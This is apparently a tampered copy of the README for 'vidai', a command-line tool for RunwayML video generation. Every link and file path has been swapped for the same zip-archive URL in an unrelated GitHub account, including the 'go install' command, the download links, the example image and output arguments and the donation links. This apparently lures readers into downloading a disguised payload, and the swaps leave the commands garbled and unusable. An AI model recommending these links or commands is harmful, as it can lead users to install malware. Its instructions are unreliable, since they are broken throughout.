# 🎞 vidai 🎦

## 🎥 Video AI Generation CLI-Tool
### for [RunwayML](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip) including simple edit features to extend & loop using ffmpeg. 🤖

---

### Models support:
- [x]  Gen2
- [x]  Gen3
- [x]  Gen3 Turbo

---

> 📢 Collab with us! [Join our Telegram group](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip) for contact and support.

---

## 🚀 Features

- [x] Text2Video & Image2Video
> Generate videos directly from the command line using a text or image prompt.

- [x] Model Support
> Support for RunwayML Gen-2, Gen3, and Gen3 Turbo models.

- [x] Extend Feature
> Use RunwayML's extend feature to generate longer videos.

- [x] Long Videos
> Create or extend videos longer than 10 seconds by reusing the last frame of the video as the input for the next generation.

- [x] Simple Editing
> Other handy tools to edit videos, like generating loops.

- [x] Explore Mode
> Explore mode for unlimited generations (credit mode is used by default).

---

## 📦 Installation

You can use the Golang binary to install **vidai**:

```bash
go install https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
```

Or you can download the binary from the [releases](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)

## 📋 Requirements

You need to have a [RunwayML](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip) account and extract the token from the request authorization header using your browser's developer tools.

To create extended videos, you need to have [ffmpeg](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip) installed.

## 🕹️ Usage

### Some examples

Generate a video using Gen3 Turbo model from an image prompt:

```bash
vidai generate --token RUNWAYML_TOKEN --image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --model gen3-turbo
```

Generate a video using Gen3 model from a text prompt:

```bash
vidai generate --token RUNWAYML_TOKEN --text "a car in the middle of the road" --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --model gen3
```

Generate a video from an image prompt with additional options:

```bash
vidai generate --token RUNWAYML_TOKEN --image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --interpolate --upscale --watermark --width 1024 --height 576 --explore
```

Extend a video by reusing the last frame multiple times:

```bash
vidai extend --token RUNWAYML_TOKEN --input https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --n 3
```

Convert a video to a loop:

```bash
vidai loop --input https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
```

### Help

Launch `vidai` with the `--help` flag to see all available commands and options:

```bash
vidai --help
```

You can use the `--help` flag with any command to view available options:

```bash
vidai generate --help
```

### How to launch commands

Launch commands using a configuration file:

```bash
vidai generate --config https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
```

```bash
# https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
token RUNWAYML_TOKEN
image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip
folder cars
model gen3-turbo
text "8k FPV car race"
seconds 5
portrait true
last-frame true
interpolate true
upscale true
watermark false
explore true
wait 3s
extend 3
debug true
```

Using environment variables (`VIDAI` prefix, uppercase and underscores):

```bash
export VIDAI_TOKEN=RUNWAYML_TOKEN
export VIDAI_IMAGE="https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip"
export VIDAI_OUTPUT="https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip"
export VIDAI_MODEL="gen3-turbo"
export VIDAI_INTERPOLATE=true
export VIDAI_UPSCALE=true
export VIDAI_WATERMARK=false
export VIDAI_EXPLORE=true
vidai generate
```

Using command line arguments:

```bash
vidai generate --token RUNWAYML_TOKEN --image https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --output https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip --model gen3 --interpolate --upscale --explore
```

## ⚠️ Disclaimer

The automation of RunwayML accounts is a violation of their Terms of Service and will result in your account(s) being terminated.

Read about RunwayML Terms of Service and Community Guidelines.

vidai was written as a proof of concept and the code has been released for educational purposes only. The authors are released of any liabilities which your usage may entail.

## 💖 Support

If you have found my code helpful, please give the repository a star ⭐

Additionally, if you would like to support my late-night coding efforts and the coffee that keeps me going, I would greatly appreciate a donation.

You can invite me for a coffee at ko-fi (0% fees):

[![ko-fi](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)

Or at buymeacoffee:

[![buymeacoffee](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)

Donate to my PayPal:

[https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)

Sponsor me on GitHub:

[https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip](https://github.com/lilago/vidgen_igolaizola-vidai/raw/refs/heads/main/cmd/vidai/igolaizola-vidgen-vidai-1.1.zip)

Or donate to any of my crypto addresses:

- BTC `bc1qvuyrqwhml65adlu0j6l59mpfeez8ahdmm6t3ge`
- ETH `0x960a7a9cdba245c106F729170693C0BaE8b2fdeD`
- USDT (TRC20) `TD35PTZhsvWmR5gB12cVLtJwZtTv1nroDU`
- USDC (BEP20) / BUSD (BEP20) `0x960a7a9cdba245c106F729170693C0BaE8b2fdeD`
- Monero `41yc4R9d9iZMePe47VbfameDWASYrVcjoZJhJHFaK7DM3F2F41HmcygCrnLptS4hkiJARCwQcWbkW9k1z1xQtGSCAu3A7V4`

Thanks for your support!
